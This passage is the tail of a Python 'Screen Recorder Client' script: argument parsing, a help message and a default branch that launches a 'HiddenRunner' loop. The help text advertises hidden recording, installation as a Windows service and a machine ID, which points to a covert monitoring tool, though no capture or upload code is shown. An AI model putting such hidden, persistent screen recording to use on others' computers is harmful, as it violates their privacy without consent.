            sys.exit(0)
        elif sys.argv[1] in ("--help", "-h"):
            print("Screen Recorder Client")
            print("")
            print("Usage:")
            print("  python screen_recorder.py          Start recording (hidden)")
            print("  python screen_recorder.py --get-id Print machine ID")
            print("  python screen_recorder.py --install Install as Windows service")
            print("  python screen_recorder.py --uninstall Remove Windows service")
            print("  python screen_recorder.py --help   Show this help message")
            sys.exit(0)
        else:
            print(f"Unknown argument: {sys.argv[1]}")
            print("Use --help for usage information")
            sys.exit(1)
    else:
        runner = HiddenRunner()
        runner.run_forever()
